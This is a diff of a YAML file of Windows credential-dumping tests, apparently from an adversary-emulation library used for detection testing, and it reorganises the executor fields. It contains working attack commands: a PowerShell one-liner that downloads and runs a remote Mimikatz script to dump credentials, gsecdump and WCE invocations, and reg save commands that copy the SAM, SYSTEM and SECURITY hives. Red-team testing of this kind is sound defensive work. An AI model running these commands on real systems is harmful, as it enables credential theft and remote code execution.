@@ -8,44 +8,51 @@ atomic_tests:
     Dumps Credentials via Powershell by invoking a remote mimikatz script
   supported_platforms:
     - windows
-  executor: powershell
   input_arguments:
     remote_script:
+      description: URL to a remote Mimikatz script that dumps credentials
       type: Url
       default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
-  command: |
-    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds"
+  executor: 
+    name: powershell
+    command: |
+      IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
 
 - name: Gsecdump
   description: |
     https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
   supported_platforms:
     - windows
-  executor: command_prompt
-  command: |
-    gsecdump -a
+  executor: 
+    name: command_prompt
+    command: |
+      gsecdump -a
 
 - name: Windows Credential Editor
   description: |
     http://www.ampliasecurity.com/research/windows-credentials-editor/
   supported_platforms:
     - windows
-  executor: command_prompt
   input_argument:
     output_file:
+      description: Path where resulting data should be placed
       type: Path
       default: output.txt
-  command: |
-    wce -o #{output_file}
+  executor: 
+    name: command_prompt
+    command: |
+      wce -o #{output_file}
 
-- name: Registry
+- name: Registry dump of SAM, creds, and secrets
   description: |
-    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
+    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated 
+    via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
   supported_platforms:
     - windows
-  executor: command_prompt
-  command: |
-    reg save HKLM\sam sam 
-    reg save HKLM\system system
-    reg save HKLM\security security
+  executor: 
+    name: command_prompt
+    command: |
+      reg save HKLM\sam sam 
+      reg save HKLM\system system
+      reg save HKLM\security security
 
